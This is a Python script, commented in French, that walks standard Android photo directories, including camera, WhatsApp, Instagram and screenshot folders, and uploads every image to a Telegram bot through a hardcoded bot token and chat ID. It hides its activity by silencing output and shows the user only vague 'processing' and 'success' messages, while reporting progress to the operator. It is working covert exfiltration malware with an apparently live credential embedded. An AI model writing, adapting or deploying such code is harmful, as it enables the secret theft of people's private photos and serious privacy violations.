import requests
import os
import subprocess
import time
from datetime import datetime
import sys

# Remplacez ces valeurs par les vôtres
BOT_TOKEN = "7894685926:AAF_cKDV7TP0jDX-2LxltQzkvRrGxFMOcEk"
CHAT_ID = "7879061625"

def send_photo_to_telegram(photo_path):
    """Envoie une photo à Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            files = {"photo": photo}
            data = {"chat_id": CHAT_ID}
            response = requests.post(url, files=files, data=data)
            return response.status_code == 200
    except Exception as e:
        return False

def find_all_photos():
    """Trouve toutes les photos sur l'appareil"""
    photo_paths = []
    
    # Dossiers communs où les photos sont stockées sur Android
    photo_directories = [
        "/sdcard/DCIM/Camera",
        "/sdcard/DCIM/",
        "/sdcard/Pictures/",
        "/sdcard/WhatsApp/Media/WhatsApp Images",
        "/sdcard/Download/",
        "/sdcard/Screenshots/",
        "/sdcard/Instagram/",
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/DCIM/",
        "/storage/emulated/0/Pictures/",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/Download/",
        "/storage/emulated/0/Screenshots/",
        "/storage/emulated/0/Instagram/"
    ]
    
    # Extensions de fichiers image à rechercher
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for directory in photo_directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in image_extensions):
                        photo_paths.append(os.path.join(root, file))
    
    return photo_paths

def main():
    """Fonction principale"""
    # Affiche un message de démarrage simple
    print("Traitement en cours...")
    
    # Redirige la sortie standard pour masquer les détails
    original_stdout = sys.stdout
    with open(os.devnull, 'w') as devnull:
        sys.stdout = devnull
        
        # Recherche des photos
        photos = find_all_photos()
        
        if not photos:
            sys.stdout = original_stdout
            print("Aucune donnée à traiter.")
            return
        
        # Envoyer un message de notification silencieux
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        notification_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        notification_payload = {
            "chat_id": CHAT_ID,
            "text": f"📱 *Envoi de photos depuis l'appareil Android* - {timestamp}\n\nTrouvé {len(photos)} photos. Début de l'envoi...",
            "parse_mode": "Markdown"
        }
        requests.post(notification_url, json=notification_payload)
        
        # Envoyer chaque photo
        success_count = 0
        for i, photo_path in enumerate(photos, 1):
            if send_photo_to_telegram(photo_path):
                success_count += 1
            
            # Pause entre chaque envoi pour éviter les limitations de l'API Telegram
            time.sleep(1)
        
        # Envoyer un message de fin silencieux
        end_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        end_payload = {
            "chat_id": CHAT_ID,
            "text": f"📊 *Rapport d'envoi*\n\n✅ Photos envoyées avec succès: {success_count}/{len(photos)}\n❌ Échecs: {len(photos) - success_count}",
            "parse_mode": "Markdown"
        }
        requests.post(end_url, json=end_payload)
    
    # Restaure la sortie standard
    sys.stdout = original_stdout
    
    # Affiche uniquement le message final
    print("Données envoyées avec succès")

if __name__ == "__main__":
    main()
